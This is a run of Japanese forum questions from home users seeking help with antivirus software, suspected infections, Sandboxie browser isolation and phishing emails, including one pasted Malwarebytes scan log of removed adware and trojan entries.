ウィルスに感染しました。デスクトップのアイコンが表示されなかったり色々おかしかったです。 フルスキャンをしたところ、５個ぐらい出てきました。 チェストに移動できるものは全部しました。が、一つだけエラーで出来ません。 それは、hosts.bakというファイルです。 「エラー：ファイルがオフラインです。」と出てきます。 これはどういうことでしょうか そこだけカスタムスキャンで検査してみると、 「いくつかのファイルをスキャンすることができませんでした。」と出てしまいます。 これはウィルスでしょうか？これ以外検出されたものは全て駆除しましたが 何かDLしようとすると明らかに遅いです。 ちなみに他に検出されたウィルスはAdwareとmalwareでした。malwareと検出されたファイルは結構昔に取ったファイルで、かなり前からあった・・。（何度かスマートスキャンはしていたが、検出されたことがなかった。スマートスキャンだったから？） が、昨日それらはチェストに移動しました。 オフラインてことはLANを繋いでスキャンしてって事かなと思い、繋いでやってみましたが同じ結果に・・・ 御知恵をお貸しください。よろしくお願いします＞＜；
未使用のmacafee internet security 2009（１年３台版）を所持していますが、 現在でも使用可能でしょうか？ macafee　のホームページから何度も問い合わせを試みたのですが、 うまくいきませんでした。 現在のバージョンへのアップデートとかできればいいのですが、 ご存知の方がいらしたら教えてください。 よろしくお願い致します。
無料ソフトをダウンロードしようとしたらダウンロード中に脅威が検出されましたというメッセージがでたのでダウンロードを途中で中止しました。 この場合ウイルスに感染しているのでしょうか?保存ボタンを押した瞬間に感染したりしますか?
sandboxieでブラウザを仮想化してネットサーフィン中にブラウザの脆弱性が攻撃されると、ネットサーフィンを終了するまではマルウェアが活動を続け、パソコン内の情報が外部に流出する可能性があると教えていただきました。 ふと思ったのですが、このマルウェアの活動には、リバース接続でパソコンを自由に操作されサンドボックス外にウイルスを埋め込まれたり、外部に接続して悪意のあるファイルをサンドボックス外にダウンロードし実行されることも含まれるのでしょうか？ 外部流出タイプなら、仮想化したブラウザを終了するとマルウェアも消滅しますが、リバース接続や外部接続でダウンロードし実行するタイプなら実環境も変えられてしまうのでは、と心配になりました。 実環境を変えられると、仮想化したブラウザを終了しても安全ではなくパソコンへの悪影響は続くことになります。
パソコンでいろいろなサイトをまわっていると、 「パフォーマンスが低下しています」 とか 「お使いのPCがウイルスにかかりました」 などがでてきます。 僕自身どうせうそだからどーでもいいやとおもっているのですが、 ほかのPCで同じサイトを見てもそのようなものは出ておらず、急に出始めたのでちょっと心配です。 これは本当なのでしょうか？ 教えてくださいお願いします。
無料のKingsoft Internet Securityを3年使っているのですが 今まで一度もウイルスにかかったことがありません。 無料だから大丈夫なの？と疑っていましたが、 結構良いソフトということなのでしょうか？ 自宅では、インターネット閲覧くらいしかしません。
パソコンのウィルス感染で、仕事で使用しているファイルを気づかないうちに書き換えられたり実行ファイルを付加されたりするのを避けたいと思っています。 パソコンのウィルス感染をウィルス対策ソフトが検知できればよいのでしょうが、今は検知できないウィルスも多いと聞いています。 ウィルス感染しても、特定のファイルを書き換えられない方法があればご教授願います。 仕事用のファイルは頻繁に開いて内容を書き換えているので、ファイルを開くときになるべく手間がかからない方法であれば有難いです。
私の知る団体の会報や機関誌であいついで誤植がみられました。それも、単なる誤植ではなく、第一節のタイトルと、第２節のタイトルが同じになってしまう、という不思議なもの。編集担当を兼ねている筆者は、「何度も見直したのに気づかなかった」と、言っています。 こういう風に、勝手に文章を書き換えてしまうようなウイルスがあるでしょうか。感染しているのでは？
サイト訪問で強制的にファイルをダウンロードさせられて、そのファイルに対応したアプリケーションでそのファイルが開かれる(実行される)ドライブバイダウンロードについてです。 カスペルスキーのブラウザ仮想化では、実行に必要なファイル(DLLなど)がないため ファイルがダウンロードされても、そのファイルに対応したアプリケーションで開かれない(実行されない)と書かれています。 http://www.kasperskystore.jp/product/technology0 … sandboxieでブラウザを仮想化した場合も、カスペルスキーと同様、ファイルがダウンロードされても、そのファイルに対応したアプリケーションで開かれる(実行される)ことはないのかどうか。 この点について教えてください。
現在PCにウィルスセキュリティソフトを入れてなくでどうやらBrontokウィルスに侵入されたようです。 そこでMicrosoft Security Essentialをダウンロードしようとしたところ何回やってもダウンロードできず勝手に再起動となってしまいます。もちろんソフトはダウンロードできていません。 他のセキュリティソフトでも駄目でした。 ネットで調べて履歴や一時ファイルなどを削除してみましたが効果ありませんでした。 PCのスペックはVistaでIE８です。Cドライブの残量は残り18Gです。 なぜダウンロードできないのか分からないのでお助けください。
http://www.computerworld.jp/topics/563/205019 によるとマルウェア遮断率でIE9が95パーセントなのに対してfirefoxとsafariは6パー、chromeは13から74だそうです。 昔はIEが危険だからとfirefoxやchromeを進める方が多かった気がしますが、それはもう昔の話で今はIEを推奨すべきですか？
タイトルの通りなのですが、知人のセキュリティーに関する意識が低すぎる気がします。 windowsMEでインターネットなんて私からしたら自殺行為に近いものを感じますが、知人に「ウイルスが入ったら、自分がパソコンでやってる事が全部ばれたり、最悪PCが壊れたりするんだよ」と言っても 「別に変なサイトみてるわけじゃないからばれてもいい。古いPCだからいつ壊れてもいい。」と言ってきます(~_~;) メールもしてないのでウイルスメールをばらまくことも無さそうです。 しかも去年の夏頃までセキュリティーソフトもいれてなかったそうで。 その後MSEを入れたそうですが、そもそもMEにMSEって入りましたっけ？ 偽ソフト？まあ、 OSのサポート切れてる時点で意味を感じませんが… 質問は 知人のPCの使い方は他社に迷惑をかけることはありませんか？ 例えば、どこかのサイトを閲覧した際にウイルスをばらまいてしまうとか。 他にも問題はありますか？ あとはどの様に諭したら新しいOS搭載のPCを買いますかね？ こちらは半ばお節介に近い気がするので回答して頂かなくても結構です。
古いXPを使用頻度の低いデータの倉庫のようにして活用しようと、 ルータを介した家庭内LANを構築しました。 このXPは外付けハードのような感覚で、 今後このXPでネットなどする予定がないので、 セキュリティソフトのライセンスを解約したいのですが、 このような場合どういった危険性が考えられますか？ ちなみにXPは有線でルータとつながっており、自動でネット接続されるタイプです（認証などがないタイプ） （本当はメインPCとXPマシンとのLAN間での双方向通信だけ許可して、XPマシンについてはインターネットとの双方向通信を遮断したかったのですが、私の知識不足ゆえに思うとおりになりませんでした・・・） XPは現在、メインPCからデータを取り出したりするときのみ電源を入れ、普段は電源を切っています。
Yahooにインドネシアからログインされています今まで６回、ウォレットとメールにアクセスしたようです。　　パソコンの初期化でもすれば、悪さされない？　　何をすればいいのでしょうか？　取り敢えず、パスワードは交換しましたが、パソコン上にパスワード等を張り付けてます。ので銀行からクレジットヤバイかもです。　どうしたらいいでしょうか？
アングラ系やエロサイトなどに行かなければ大丈夫なんてなぜ言えるんでしょうか。 説明お願いします。
どちらの方が良いのでしょうか？ （無料版の場合） ご回答を、よろしくお願いします。
windows8にはOSの機能として再インストール（リセット）がありますが、この機能の使用はウイルス感染を疑われる場合の対処として妥当でしょうか？windows7以前と同様の再インストールを行ったほうが確実ですか？7以前同様の方法だとライセンス認証が維持できないので不便なのですが。どうでしょうか。
hao123はトロイの木馬なんですか？　パソコンにある製品版のウィルスバスタークラウドで スキャン（コンピュータ全体のスキャン）したときは検出されなかったのですが、 トレンドマイクロオンライン（http://safe.trendmicro.jp/products/onlinescan.aspx） でスキャンすると、何故か下の画像のように検出されます。　 特に変わった事もないのですが、放置しても大丈夫なのでしょうか。
登録なんて身に覚えないのに、 しょっちゅうポップアップが出てきます。 「アダルトサイトの登録が完了しました」というもの。 しかも有料です。 私はまだ16歳なのでそんなん回らなければ回りたくもないのに そういう広告が出て冷や汗が止まりません。 しかもこのPCは親と共同で使ってるので、バレたら誤解招くし怒られます… 助けてください。 とにかく助けてください。 解決策はありませんか。 再起動しても何も変わりませんでした。 怖くて手が震えています。
日頃よりポータルサイトgooをご利用いただき誠にありがとうございます。 現在、gooIDに対する機械的な不正アクセス行為を確認しております。 そのため、不正アクセスの可能性があるgooIDアカウントにつきましては、 お客様情報保護の観点から、やむをえずログインロックをさせていただいております。 っていうメールが送られてきたのですが… 変なサイトに接続するんじゃないかと思うとなかなかクリックできません。 皆さんにもこのようなメールきましたか？ やはり変更した方がいいのでしょうか？
こんにちは。 １度同じ質問をしましたが、もっとアドバイスが欲しいので再度質問させていただきます。 セキュリティソフトについて悩んでいます。 ※構図 [インターネット]---[サブPC]--[メインPC] (1)メインPC CPU：core i7 990x メモリ：24GB SSD：512GB OS：Windows7 セキュリティソフト：norton 360　その他多数(spybot、Outpost等) (2)サブPC(サーバーPC) CPU：core2 Duo E6700 2.66Ghz メモリ：3ＧＢ HDD：500ＧＢ（Cドライブ：100ＧＢ　Ｄドライブ：400ＧＢ） OS：Windows XP セキュリティソフト：●●●●● ここの●●●●を埋めたくて質問しました。 私は自分が使用している機器にIPアドレスを設定し、串を通してサブPCで管理しています。 ⇒メインPC・PS3・スマホ・ノートパソコン・タブレッド・テレビなどなど一度はサブＰＣを経由してログを残します。 サブＰＣにセキュリティソフトを導入していると危険なファイルやサイトを今までブロックしてくれました。 ここで、本題です。 ・ファイアーウォール・有害サイトブロック等に優れたセキュリティソフトはないでしょうか？？ ・サブＰＣなので迷惑メール対策、個人情報保護などは別にいらないです。 ・Norton以外の商品でお願いします。 ・無料、有料どちらでもかまいません（性能重視です。）
いつもお世話になります。 ウイルス対策ソフトは、マイクロソフトディフェンダーだけで大丈夫でしょうか？
　迷惑メールと通常のメールを見分ける方法を教えて頂けませんか？ 　セキュリティーソフトを導入したり、パソコンを定期的に更新しているので基本的なセキュリティーには問題がありません。 　しかし、通常のメールに似せて、迷惑メールが届いてしまった場合は見分けられないことがあります。その場合、どうチェックすればいいのかを教えて頂きたいです。 　自分なりにやり方を考えてみました。　 　１つ目は、送られてきた日時を確かめることです。通常の日時で無ければ少し疑うべきです。 　２つ目は、内容を確かめることです。通常とは違う内容であるかどうかを確かめます。 　３つ目は、画像を確かめることです。画像にもウイルスが入れられていることがあります。セキュリティーソフト等で確かめる必要があります。 それ以外にございましたら教えてください。
BBセキュリティのノートン更新後、シャットダウン時にかなりの頻度で下記のブルースクリーンになります。 更新前には一度も起こらず、本日ＰＣ専門店にて、HDDやメモリなど、PCのハード的な問題ではないことが分かりました。 ブルースクリーン発生時の概要 Stop 0x000000cb , DRIVER LEFT LOCKED PAGES IN PROCESS , BHDrvx86.sys 他のセキュリティソフトへの変更も考えたのですが、今までの使い勝手とIDセーフ機能のため、他への変更に躊躇しております。 BHDrvx86.sysにのみ原因があるなら、削除するとか無効にして（それによる一部機能制限になる？）問題が解消するなら、そうしてみたいのですが、このファイル自体がどういうものなのか、また、これを削除や無効にしても大丈夫なのかどうか分かりません。 どうぞ、優しいご回答をお願いいたします。
最近TRAVIANとかmatch.comとか勝手に後ろに新しい窓ができて出てきます。 セキュリティソフトはずっと入れてるんですが、少し前にavastからESETsmart securityに変えました。 ウィルスに感染したんでしょうか？ 対処法はありますでしょうか？
ウイルスバスター6.0.1245のセキュリティーレポートで Web脅威が１件検出されました。 以上は自動的に表示されましたが、これに対して私は「何をする必要があるか」具体的な手順を教えて下さい。 なお、「詳細の表示」をクリックしたら次のとおりで、 ウイルス/脅威=１８レコード、感染源=Cookie　処理=削除済み(18件) Web脅威のことは何も書いてなかったです。
私はネット検索位しかできないパソコン素人です。 旦那がパソコンをしていたとき、ウィルス検出ソフトがウィルスを発見したようです。 ウィルスは撃退をしたと言っていましたが、どんな被害にあったのかが不安です。 旦那はデータをばら撒く系だといっていましたが詳しくは分からないらしいです。 写真やカードの情報が知らない所で知らない人が見ていると思うと嫌です。。 見られたとか、確認する事は出来るのでしょうか。 なにも分からないので気持ちばかりが焦ってしまって落ち着きません。 ばら撒く系がどんな被害にあうのが具体例など教えていただきたいのと、今しておくべき事などのアドバイスがいただけたらとおもいます。 よろしくお願いします。
http://support.kaspersky.co.jp/faq/?qid=208290731 これなんですが何ギガバイトのUSBメモリを用意すればいいのでしょうか？ また、使用してるのはカスペルスキー３台版で、２台はネットにつながってて更新したいのは常時オフライン（カスペルスキーのアクティベーションは完了）の一台なんですが、インターネット常時接続の２台どちらかのカスペルスキーのフォルダから定義ファイルの更新データを流用することはできないのでしょうか？ 教えてください。
パソコンが脅威にさらされているとの表示でフルスキャンしたら、スキャン項目数は４２６６００であり、 時間が３時間３０分掛かった。 　こんなものでしょうか。 スキャンを深夜にしていますが、電源をＯＦＦにしていた場合何時行われるのでしょうか。
Windows XP で、Avira Free Antivirus と PC Tools Firewall Plus を使ってきました（いずれもフリー）。 これからWindows 7（64 bit） で　PCを新しく自作しようとしていますが、フリーセキュリティで判断に迷っております。 (1) PC Tools Firewall Plus のフリー版は開発終了のような情報がありましたが、本当でしょうか？ (2) そうだとすると、Comodo Firewall Pro を使おうと考えていますが、Windows 7（64 bit）上で、Avira Free Antivirus ＋ Comodo Firewall Pro でお使いの方がおられましたら、何か問題がないかお教えいただけませんでしょうか？ 　よろしくお願いいたします。
ちゃんと機能しているのか調べたいです。 実は、ノートンから乗り換えて1日ほど、機能していることに気づかずに過ごしていました。 スキャンそのものができない、EICAR.comというテストファイルを平気でDLしてしまう、など これについてはセーフモードでノートンをアンインストールをやり直すことで治ったのですが。 念の為に調べたいのですが、害の無いテストサイトとかないでしょうか？
この前ノートンからキングソフトアンチウイルスに変更したのですが 無料ソフトだったのでやはり心配です。 このソフトはちゃんとウイルス対策をしてくれるのでしょうか？
ヤフーオークションで 日本語最新版 Norton Internet Security 2013年版 2年3PC が2000円くらいで落札できるのですが 随分安いと思うのですが、ちゃんと使えるのでしょうか？よろしくお願いします
firefoxをsandboxieで仮想化してネットサーフィン予定です。 3点お伺いしたいです。 1 ネットサーフィンをしていると勝手に裏でファイルを強制的にダウンロードさせるサイトがあり、ダウンロードされるファイルは、実行ファイルと実行ファイル以外のファイルの2種類に分けられると思います。 カスペルスキーのブラウザ仮想化では、実行に必要なファイル(DLLなど)がないためファイルがダウンロードされても実行されないと書かれています。 http://www.kasperskystore.jp/product/technology0 … sandboxieでfirefoxを仮想化してネットサーフィンする場合 ○実行ファイルが勝手にダウンロードされても実行されることはない ○実行ファイル以外のファイルがダウンロードされても、そのファイルに対応したアプリケーションで開かれる(実行される)ことはない のでしょうか。 2 sandboxieでfirefoxを仮想化している場合 firefoxのアドオン(adblock plusやfiregestueres等)・プラグイン(adobe readerやflash player等)を有効にしてネットサーフィンをしても アドオン・プラグインは仮想環境下にあり、それらの脆弱性を攻撃されることがあってもパソコンに悪影響はないでしょうか？ 3 1のような強制的にダウンロードさせるサイトではなく、通常のサイトではファイルをダウンロードすると [プログラムで開く]または[ファイルを保存する]のダイアログが表示されます。 sandboxieでfirefoxを仮想化してネットサーフィンする場合 [プログラムで開く]を選択すると、そのプログラムは仮想環境下で実行されるのでしょうか？ たとえば、xlsファイルをダウンロードした時に[プログラムで開く]を選んでエクセルで開いた場合、エクセルは仮想環境下で果たして動いているのか、という問題です。
４年ほど前に約一ヶ月だけ出会い系のサイトに登録し利用したことがあり、その時からよく迷惑メールが来るようになりました。（現在は一日平均５０通強です。） 当初はそのサイトからのメンバーの紹介メールがほとんどでしたが、 今では全然知らないサイトからの紹介も来たり、 お金を入金しただとか、高額収入の仕事の紹介とか出会い系とは関係ないメールも半分くらいを占めるようになりました。 現在は、出会い系など利用していないので、これらの類のメールを出来るだけ来ないようにしたいと考えています。 前置きが長くなりましたが、現在一つ一つメールのサイトにアクセスして退会するよう作業を始めたばかりです。 一つ退会しただけで別のドメインのメール先にアクセスしても退会済みとなっているケースなども結構あり、効果はあるように思えます。（実際今後メールが来れば意味ないですが・・・。） ただ、メリットのない退会処理（退会処理する為に空メールを送らせたり、退会するボタンを押させること）は、業者の策略なのだろうかと疑念が浮かびました。 そんなことは考えすぎで、退会処理を設ける業界のルールなどがあり懸念することはないのでしょうか。
毎年ノートンのアンチウイルス２０１２を使用しています。1年間のライセンスがあります。 今日、パソコン上に「あと３０日で期限が切れます」というメッセージが出たので更新しようと思うのですが、ダウンロード版だと割高なにで、Amazonなどでパッケージ版を購入しようと思います（毎年そうしています） ところが、Amazonを見てみたら、「アンチウイルス　２０１３」なるものが見あたりません。 去年までは期限が近づくと同じようにAmazonを見て最新年のアンチウイルスを購入していたのですが、今年は２０１３年版はないのでしょうか？ また、去年買った２０１２年版がまだ売っているのですが。これは使えないのでしょうか？ それともライセンスが新しければ古いアンチウイルスでもまた使えるのでしょうか？
昨日同じ質問をしたのですが、解決した後気になる事が起き、質問します。 http://okwave.jp/qa/q8014833.html が、昨日の質問でした。この回答に、 ＞＞他のプログラムをＤＬして実行することで、複合ファイルで効果のあるウィルスである とあります。実はこの解決の後、「Java」で何かのプログラムかアプリケーションが「実行しますか？」と出てきました。Javaのupdateでこんなのは出たことないので、恐らくこのマルウェアに関係あるんだと思いキャンセルを押しました。１回目は消えませんでしたが、２回目で消えました。 これってやはり不正プログラムですか？ウイルスバスターは削除したのに、その後でこうして出てくるとなると、 ＞＞結局盗まれるのは、個人情報であり、データです。。 　　ただし、そのウィルスが削除できていれば、何もできなくなります。 削除しきれてない？削除後もう１度スキャンしたんですけどその時は何も出ませんでした。 怪しいのでキャンセルしましたが、どうなんでしょうか？教えて下さい。
使用OS: Windows Vista SP2 つい最近、BBセキュリティのノートンにて、NIS2012からNIS2013への更新のお知らせがあり、実行したところ、シャットダウン時にＰＣがブルースクリーンになり再起動を起こしました。（更新前には一度も起こらず、更新後はかなりの頻度で発生）。 ブルースクリーン発生時の概要 Stop 0x000000cb , DRIVER LEFT LOCKED PAGES IN PROCESS , BHDrvx86.sys 　このような問題は初めてで、当初はＰＣ不良になったと思いましたが、いろいろな対応を行ったが変化があ​りませんでした。 １．そこでまず、ＢＢセキュリティーのサポートに電話して下記作業を実施 (1)削除ツールによるアンイストール 　→アンイストール後に２、３回シャットダウンを試したところ、問題は発生しなかった (2)再インストール 　→ブルースクリーン発生　 ２．上記１．で症状が改善されず再度電話すると、パソコンメーカー（富士通）の方に問い合わせしてくれと丸投げされました。 上記１．の(1)アンイストール後でも症状があれば、ＰＣの問題かもしれず、メーカーへの問い合わせするのも納得できますが、更新前とアンイストール時には問題が出ないのに、更新後に問題が出るのはセキュリティソフトの問題なのでは？ しかも、メーカーサポートって有料だし…。 そこで、この場を借りて皆さんのお力を貸して頂きたく質問させて頂きました。 よろしくお願いいたします。
マカフィーの期限が切れそうだったので。新しいウイルス対策ソフトを入れようと思い、ESETを購入しました。それでインストールして、ちゃんと動作してるんですが。入れたと同時に新しいネットワークを検出しました、会社などで使用するネットワークの場合はこちらを、自宅などの場合はこちらに進んでくださいというウィンドウが出てきました。すでに自分のネットワークには有線接続してるし、自分はデスクトップpcで無線受信の機能はないと思われます。これはなんなんでしょうか、ipアドレスも一番最後の数字が自分のと違います。最初に出てきたとき、キャンセルをしてウィンドウは閉じたんですが、pcを起動すとまたおのウィンドウが出てきます。イーセットををインストールしてからちょうど起こったものなので。怪しいネットワークや、侵入してきているネットワーク？ってかんじはしないのですが、自分ですでにネットワーク接続していているのに、なんでこんなウィンドウがでてくるんでしょうか、そしてこれを表示させないようにするのはどうすればいいんでしょうか。　 自分はwin8で接続のとこをみてみると、自分のネットワークにちゃんと接続しているだけです。 さらに、その新しいネットワークに接続するのにも、向こうのパスワード　ID を入力する必要があるようで、接続もできないようですし、このウィンドウはなんなんでしょうか、どうすればいいのでしょうか ほかに必要な情報があれば、自分がわかる限り補足していきますので、どうかよろしくお願いします
kosiankopeさん Skypeで送られてきた あなたはこの絵でクレイジー に見える（笑）書いてあり、 それのURLを押して しまって、インストールして しまい。 IDを乗っ取られて 拡散させられるウイルスに 引 っかかってしまいました。 その送られた方からSkypeの チャットで ウイルスに対処するパッチの URLをいただいたのですが、 開く前にフリーズしてしまい 強制終了し、また起動して セーフモードで作業しようと したら、下のURLの先にある 動画と全く同じ症状で 起動しません。 セーフモードを押して、読み込んでいる時に物凄い「キー！」 という音がします。 音はHDDの音かもしれません。 データはどうでも良いので、 ウイルスがいない 初期状態に戻したいのですが どうすればいいですか？ windows7です ちなみにこれを参考にしました http://mimikan.blogspot.jp/?m=1
親友がSkype で送られてきた『あなたはこの絵でクレイジーに見える（笑）』というメッセージの付いたファイルを開いてしまい、ウィルス感染してしまいました。 自分は開かなかったので大丈夫だったんですが、ウィルスにかかってしまった親友が困ってるので助けてあげたいです。 http://kuku.neko2.net/?num=2793 このサイトさんは有名で、この方法で対処できた方が殆どのようですが、親友も同じ方法で駆除を試みたのですが、どうやらそのサイトさんでDLした対処パッチもエラーを起こしていて使えないようで、駆除できずにいます。 同じことになったことある方、こうなった場合どうしたらいいか、詳しい方力を貸してください。よろしくお願いいたします。
クライアントとしてのLinuxのセキュリティはWindowsと比べてどうなのでしょうか？ Linuxもコンピュータである以上、Windowsと同じく常にリスクに 晒されているのではないかと思うのですが。 それともセキュリティに強いと言える、Windowsと異なる仕組みでも 持っているのでしょうか。 どうかよろしくお願いします。
3DS で、ネットをしていました。 正直いろいろなサイトを見ていたのですが、ウイルスとかは大丈夫なのでしょうか？ それらしき症状はでていないのですが、とても、気になります。 対策など、あるのでしょうか？
avast8(無料版)にアップデートしたらThunderbirdでGmail(imap)の受信が出来なくなりました。 アップデート以前は何もせずに受信できていたのですが、現在はタスクバーのアイコンを右クリックのメニューからシールド制御を無効にする　の操作をして受信しています。 以前のように、このような操作をしなくてもimapでGmailを受信するには何処を設定すればいいですか？ pop3のアカウントは何もしなくても受信できています。
自宅のＰＣが、ウイルスに感染してしまったようです。 １つのパソコンを２人でそれぞれのアカウントを作成して使用していますが、一方のみウイルス感染しているようです。 症状：ログインすると自動的にＡＶＡＳｏｆｔ Ａｎｔｉｖｉｒｕｓが起動し、勝手にスキャンを開始します。 　　　 インターネットは遅いながらも使用できますが、その他のソフトを起動しようとすると、 　　　 右下に「Ｗａｒｎｉｎｇ」　と表示され、起動することができません。　 ＰＣ：ＬＩＦＥＢＯＯＫ　ＡＨ56／Ｇ ＯＳ：Windows7 正常な方のアカウントを使って、ウイルスバスタークラウドをインストールし、実行しました。 「コンピュータ全体のスキャン」により、ウイルスが検出され、「削除済み」と表示されています。 しかし、症状は改善されておりません。 リカバリーするしかないのでしょうか。 感染しているのは、権限のあるメインアカウントのみですが、このアカウントを削除すれば解決するのでしょうか。 公的に相談するべき機関も分からず困っております。 どうぞよろしくお願いいたします。
今使用版一カ月期限のを使っていますが、ここに一か月版を買うと1年一か月使えるのでしょうか？
1台のパソコンを（A,B）２人で共有している場合のことでお尋ねします。 ２人はそれぞれにIDとパスワードで起動しているとして、Aがインストールしているアプリが ウイルスに感染した場合、Bも同じアプリをインストールしていれば感染するのでしょうか。
USランドというレジャー施設があります。そこに行きたいのですが、困ったことにその施設のサイトがウイルスにやられているようです。 １ヶ月前知人のマシンでそのページを訪れたら、セキュリティソフトがエラーを出しました。 これがまだウイルスに感染しているか見てもらえないでしょうか。 今、あまりセキュリティがしっかりしていないパソコンからしか見れないので、怖くて閲覧出来ません。 USランド　という言葉でGoogleで検索すればトップに出てくるところです。 ※まだそのサイトがウイルスに感染している状態の可能性があります。閲覧する方はご注意ください<(_ _)>
avast有料ライセンスを使用中ですが、ＷｉｎｄｏｗｓXPでシステムの復元をおこなったところ、 登録残りが0になって動かなくなりました。 ライセンスキーを取り寄せインストールしようとしますが、受け付けません。 ファイルがあるのに、ないと出ます。 どのようにすればよいか教えて下さい。
Malwarebytes Anti-Malwareを使用して、ウィルス駆除をやってみました。 以下が結果のログですが、これで大丈夫なのでしょうか。 補足や、アドバイスありましたらお願いします。 また、削除されたものがどのようなものだったか説明できる方がいましたら教えてください。 ++++++++++++++++++++++++++++++++++++++++++++++++ Malwarebytes Anti-Malware 1.70.0.1100 www.malwarebytes.org 定義バージョン： v2013.03.18.15 Windows Vista Service Pack 2 x86 NTFS Internet Explorer 9.0.8112.16421 ☆[管理者] 2013/03/19 8:11:11 mbam-log-2013-03-19 (08-11-11).txt スキャンタイプ： クイックスキャン 有効なスキャン領域： メモリ | スタートアップ | レジストリ | ファイルシステム | ヒューリスティック/追加アイテムのスキャン　 | ヒューリスティック/Shuriken　エンジンを使用してスキャン　 | 不審なプログラム　（PUP） | 不審な変更　（PUM） 無効なスキャン領域: ピア・ツー・ピアプログラム（P2P） スキャンしたアイテム数: 219057 経過時間： 15 分, 10 秒 メモリプロセスの検出: 2 C:\ProgramData\GBox\GBox.exe (Trojan.Dropper) -> 3708 -> 再起動後に削除されます。 C:\ProgramData\OptimizerPro1\OptimizerPro1.exe (Trojan.Dropper) -> 3716 -> 再起動後に削除されます。 メモリモジュールの検出: 0 (悪意のあるアイテムは検出されていません。) レジストリキーの検出: 10 HKCU\Software\Google\Chrome\Extensions\cjpglkicenollcignonpgiafdgfeehoj (PUP.FunMoods) -> 何の措置も取られませんでした。 HKLM\SOFTWARE\Google\Chrome\Extensions\cjpglkicenollcignonpgiafdgfeehoj (PUP.FunMoods) -> 何の措置も取られませんでした。 HKLM\SOFTWARE\Wow6432Node\Google\Chrome\Extensions\mpfapcdfbbledbojijcbcclmlieaoogk (PUP.GamesPlayLab) -> 何の措置も取られませんでした。 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\GBox (Trojan.Dropper) -> 正常に隔離され削除されました。 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\OptimizerPro1 (Trojan.Dropper) -> 正常に隔離され削除されました。 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Ext\Settings\{11111111-1111-1111-1111-110011221158} (Adware.GamePlayLab) -> 正常に隔離され削除されました。 HKLM\SOFTWARE\Microsoft\Internet Explorer\Low Rights\ElevationPolicy\{11111111-1111-1111-1111-110011221158} (Adware.GamePlayLab) -> 正常に隔離され削除されました。 HKCU\{5617ECA9-488D-4BA2-8562-9710B9AB78D2} (Adware.DoubleD) -> 正常に隔離され削除されました。 HKLM\SOFTWARE\Internet Saving Optimizer (Adware.DoubleD) -> 正常に隔離され削除されました。 HKLM\SOFTWARE\Media Access Startup (Adware.DoubleD) -> 正常に隔離され削除されました。 レジストリ値の検出: 0 (悪意のあるアイテムは検出されていません。) レジストリデータ項目の検出: 3 HKLM\SOFTWARE\Microsoft\Security Center|AntiVirusDisableNotify (PUM.Disabled.SecurityCenter) -> 悪: (1) 良: (0) -> 正常に隔離され修復されました。 HKLM\SOFTWARE\Microsoft\Security Center|FirewallDisableNotify (PUM.Disabled.SecurityCenter) -> 悪: (1) 良: (0) -> 正常に隔離され修復されました。 HKLM\SOFTWARE\Microsoft\Security Center|UpdatesDisableNotify (PUM.Disabled.SecurityCenter) -> 悪: (1) 良: (0) -> 正常に隔離され修復されました。 フォルダの検出: 1 C:\Users\☆\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Disk Antivirus Professional (Rogue.FakeAV) -> 正常に隔離され削除されました。 ファイルの検出: 5 C:\Users\☆\Local Settings\Application Data\Google\Chrome\User Data\Default\Local Storage\chrome-extension_cjpglkicenollcignonpgiafdgfeehoj_0.localstorage (PUP.FunMoods) -> 何の措置も取られませんでした。 C:\Users\☆\AppData\Local\Google\Chrome\User Data\Default\Local Storage\chrome-extension_cjpglkicenollcignonpgiafdgfeehoj_0.localstorage (PUP.FunMoods) -> 何の措置も取られませんでした。 C:\ProgramData\GBox\GBox.exe (Trojan.Dropper) -> 再起動後に削除されます。 C:\ProgramData\OptimizerPro1\OptimizerPro1.exe (Trojan.Dropper) -> 再起動後に削除されます。 C:\Users\☆\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Disk Antivirus Professional\Disk Antivirus Professional.lnk (Rogue.FakeAV) -> 正常に隔離され削除されました。 (終)
fishingの疑いありとのことで、Facebookからのメールが決まって迷惑メールに入ります。 当初はウイルスソフトがそう判断したと思って開くことなく迷惑ホルダから削除していました。 ところが、知人からの分もfishingの疑いありとなって来ました。 ウイルスソフトのメーカーに尋ねたところ、「vista＋Winメール」ならmicrosoftに尋ねなさいとのことでした。 そこで、経験者が多いここでお尋ねします。 どこかの設定でFacebook＝fishingになっていないか、或いは確認すべきところがあれば教えてもらえませんか。
ウィルスに感染したHDDでOSを起動している時に 別のHDDもつなげていたら そっちにもウィルスは感染する可能性はありますか 可能性はどのくらいですか、既存するウィルスの中にそういった機能を持っているやつはいますか HDD1 ウィルス感染　OSの入ったディスク HDD2 別のOSが入ったディスク　無感染 HDD3 別のOSが入ったディスク　無感染 １のブートディスクはWindowsです。他のもバージョンは違うがWindows、linux、unix等もあり ２と３はケーブルを指して通電した状態です。 感染１から２と３に飛び火する可能性はありますでしょうか？ Windowsに２と３へのアクセスを許可したくありません。どのようにすれば実装できるでしょうか？
現在ウイルスバスターを利用しており、２０１３への更新をトレンドマイクロより薦められてます。 そこで更新する際はポップアップより更新のボタンをクリックで更新するか、２０１３をデスクトップにダウンロードし、旧バージョンを削除→２０１３をインストールがいいのかお尋ねさせていただきたいのです。 簡単な更新ですと旧バージョンがうまく削除できない場合があるとも聞きました。 出来れば簡単な方がいいのですが、アドバイスがありましたらよろしくお願いいたします。
Win7、カスペルスキーインターネットセキュリティを使用しています。 セキュリティソフトの完全スキャンは、通常モードでするだけでなく、セーフモードでもしなければいけないのでしょうか？ （セーフモードでスキャンしたら、通常モードではしなくていいですか？） よく分からないので教えて下さい。
仮想化でのセキュリティの確保について。ノートンかウイルスバスターかで迷っています、当方現在MacOS10.8.2。Vmware上でWindows8を利用、ウイルスバスターはライセンスで3回迄インストール可能という事です。同じPCでWindows画面とMac画面とで2回のインストールはお得だと思いますが、以前ノートンを使っていたこともあり、どちらにするか迷っています。仮想化Windowsのセキュリティについてどなたか教えてください。よろしくお願い致します。
おススメのフリーのウイルス対策のソフトはありませんか？ 現在はavgというもので30日間保護されているようです。 わけのわからないものがいっしょについていることが多くどうすればいいかわかりません＞＜
